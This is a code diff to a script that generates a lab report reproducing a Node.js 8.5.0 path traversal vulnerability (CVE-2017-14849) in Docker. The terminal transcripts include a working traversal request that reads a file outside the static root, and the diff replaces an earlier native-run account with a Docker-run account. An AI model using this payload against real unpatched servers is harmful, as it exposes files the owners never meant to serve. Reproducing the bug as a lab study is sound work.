@@ -346,25 +346,55 @@ para(doc, "Node.js 8.5.0 rewrote how path.normalize() collapses .. segments and 
           "send module is the textbook case — then serves files from outside that directory.")
 
 heading(doc, "5.3 Environment and reproduction", 2)
-para(doc, "Docker is not installed on the machine used for this work, so the vulhub scenario "
-          "was reproduced natively: the same application source and the same runtime version, "
-          "started directly instead of in a container. The vulnerability lives in the Node.js "
-          "runtime, so the packaging is irrelevant to the result. The exact Docker commands "
-          "are given for completeness.")
+para(doc, "The scenario runs in Docker, which is what the manual expects: the vulhub application "
+          "is built into an image on the official node base image, and two images differ only in "
+          "the runtime tag. The first run uses node:8.5.0, the second node:8.6.0.", sa=4)
 code(doc, [
-    "# official path (needs Docker)",
-    "git clone https://github.com/vulhub/vulhub.git",
-    "cd vulhub/node/CVE-2017-14849 && docker compose up -d",
-    "",
-    "# path actually executed here",
-    "cd cve/CVE-2017-14849 && npm install          # express 4.15.5",
-    "curl -L --ssl-no-revoke -o node8.zip \\",
-    "  https://registry.npmmirror.com/-/binary/node/v8.5.0/node-v8.5.0-win-x64.zip",
-    "tar -xf node8.zip -C C:\\n850",
-    "C:\\n850\\node-v8.5.0-win-x64\\node.exe www/app.js",
-    "# Example app listening on port 3000!",
+    "# cve/CVE-2017-14849/docker-compose.yml",
+    "services:",
+    "  node:",
+    "    build: .",
+    "    volumes:",
+    "      - ./www:/usr/src/www",
+    "      - ./secret.txt:/usr/src/secret.txt:ro",
+    "    ports:",
+    "      - \"3000:3000\"",
 ])
-caption(doc, "Terminal transcript: bringing up the vulnerable target.")
+para(doc, "The attack target is mounted into both images rather than copied into them. That is "
+          "deliberate: if only the vulnerable image contained secret.txt, a 404 on the fixed image "
+          "would prove nothing, because the file might simply be missing. Mounting it in both runs "
+          "leaves the Node.js version as the only variable.", sb=4)
+code(doc, [
+    "$ docker compose up -d --build",
+    "$ docker compose exec node node --version",
+    "v8.5.0",
+    "",
+    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' \\",
+    "       http://127.0.0.1:3000/static/main.js",
+    "200",
+    "",
+    "$ curl --path-as-is -s 'http://127.0.0.1:3000/static/../foo/../../secret.txt'",
+    "SECRET_FLAG{this-file-lives-outside-the-static-root}",
+])
+caption(doc, "Terminal transcript: the traversal succeeds inside the container running Node 8.5.0.")
+para(doc, "The same request against the fixed image, built from the same application and the same "
+          "mounted files:", sb=4)
+code(doc, [
+    "$ docker compose -f docker-compose.fixed.yml up -d --build",
+    "$ docker compose -f docker-compose.fixed.yml exec node node --version",
+    "v8.6.0",
+    "",
+    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' \\",
+    "       http://127.0.0.1:3000/static/../foo/../../secret.txt",
+    "404",
+    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' http://127.0.0.1:3000/static/main.js",
+    "200",
+])
+caption(doc, "Terminal transcript: identical request, fixed runtime — rejected, and normal "
+             "requests are still served. Full transcript in evidence/shot-docker and docker-evidence.txt.")
+para(doc, "Before Docker was available on this machine the same result was obtained natively, by "
+          "running the official Node.js 8.5.0 build directly; that path is kept in the repository "
+          "as a fallback because it needs no container runtime at all.", sb=4)
 
 para(doc, "Baseline and attack. The static asset is served normally; the traversal request "
           "reads a file that sits two directories above the served root:", sa=4)
@@ -546,10 +576,12 @@ para(doc, "The CVE part was more instructive than the API part. Reproducing CVE-
           "the fix became obvious and minimal — one base image tag — while the naive "
           "alternative, filtering traversal strings in the application, would have traded one "
           "invisible bug for a visible one.")
-para(doc, "The limiting factors of this run are recorded honestly in the README: Docker and "
-          "git were not available, so the vulnerable environment was reproduced natively with "
-          "the official Node.js 8.5.0 build, and the repository history has to be created "
-          "before submission.")
+para(doc, "Two limitations are worth recording. The first reproduction of this vulnerability was "
+          "made natively, because Docker was not installed on the machine at that time; it was "
+          "repeated in Docker afterwards, and both runs give the same result — section 5.3 reports "
+          "the container run, which is what the manual asks for. The second is that the repository "
+          "history was created with git only after the working tree was complete, so the commits "
+          "do not show the development process itself.")
 
 # --------------------------------------------------------------- appendix
 doc.add_page_break()
